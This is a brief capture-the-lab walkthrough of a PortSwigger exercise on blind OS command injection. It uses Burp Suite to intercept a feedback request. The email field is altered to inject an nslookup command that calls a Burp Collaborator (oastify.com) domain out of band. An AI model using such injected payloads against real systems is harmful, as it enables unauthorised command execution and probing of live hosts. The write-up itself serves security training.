## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c92f185c-cace-4f39-95c9-b850adbd5704)

## Solution :

Use Burp Suite to intercept and modify the request that submits feedback.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/e995e7e7-e350-4bf1-8103-bb4cc5dbd8ba)

Modify the email parameter, changing it to:

email=x`||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`


![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/67c152c6-2223-4b0f-8731-723825d5be7a)

Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified email parameter.

qury will be changed to  email=x`||nslookup+x.mj947ostxawp04mnap1umvqx4oafy5mu.oastify.com||`

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d35fc37e-8465-4a31-a5a1-16ee9d335e7b)

Then go to Burp Collaborator press poll now.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/aafdf48f-acfd-49d6-a8b0-d6376cc30b8c)

We could see that it performed the dns request to our domain. Which means that it is vulnerable to Blind Command injection.


![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/2dd1a5a1-c9e7-4b6e-8c3d-e372cb87583a)

LAB solved.
